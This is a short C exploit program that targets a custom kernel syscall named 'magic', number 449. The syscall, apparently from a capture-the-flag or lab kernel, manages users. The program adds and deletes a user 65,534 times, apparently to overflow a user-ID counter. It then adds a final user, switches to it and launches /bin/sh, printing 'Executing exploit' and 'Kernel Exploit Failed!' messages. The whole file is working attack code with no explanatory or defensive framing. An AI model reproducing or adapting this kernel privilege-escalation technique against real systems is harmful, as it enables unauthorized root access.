#include <stdio.h>
#include <unistd.h>
#include "syscall_lib.h"
    
typedef enum {
    MAGIC_ADD = 0,
    MAGIC_EDIT = 1,
    MAGIC_DELETE = 2,
    MAGIC_SWITCH = 3,
} MagicMode;

_syscall3(449,     magic,      long,    MagicMode, unsigned char *, unsigned char *);

int main(){
    char user[64] = "timetravel3";
    char password[64] = "passwd";
    unsigned int nextUser;

    puts("Executing exploit");

    for(nextUser = 2; nextUser < 65536; nextUser++){
        if(magic(MAGIC_ADD, user, password) < 0) {printf("User Not Created (id: %d)", nextUser);}
        if(magic(MAGIC_DELETE, user, password) < 0) {printf("User Not Deleted (id: %d)", nextUser);}
    }
    

    if(magic(MAGIC_ADD, user, password)<0) {puts("Final User not created");}
    if(magic(MAGIC_SWITCH, user, NULL)<0) {puts("Kernel Exploit Failed!");}
    system("/bin/sh");

}
